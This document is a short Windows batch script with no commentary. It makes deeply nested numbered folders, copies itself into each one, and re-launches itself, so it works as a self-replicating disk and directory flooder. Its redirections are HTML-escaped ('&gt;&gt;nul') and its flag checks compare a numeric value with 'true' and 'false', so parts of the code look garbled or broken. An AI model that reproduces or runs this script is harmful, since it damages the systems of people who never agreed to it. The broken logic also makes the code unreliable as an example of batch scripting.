@echo off
set flag=1
:loop
rem break=off
if %flag%==false goto halt &gt;&gt;nul
if %flag%==true goto continue &gt;&gt;nul
:begin
set dir=1
rem set c=1
:continue
if %dir%==11111111 goto halt &gt;&gt;nul
md %dir% &gt;&gt;nul
set c=%c%1
if exist %0.bat copy %0.bat %dir% &gt;&gt;nul
if not exist %0.bat copy %0 %dir% &gt;&gt;nul
if %c%==1111111111111111111 goto gon &gt;&gt;nul
cd %dir% &gt;&gt;nul
rem call %0
goto loop
:gon
cd ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\.. &gt;&gt;nul
set dir=%dir%1
set flag=true
set c=1
rem call %0
goto loop
:halt
set flag=false
rem cd ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..
cd 1 &gt;&gt;nul
set dir=1
set c=1
set flag=flag
echo pause
rem pause
%0
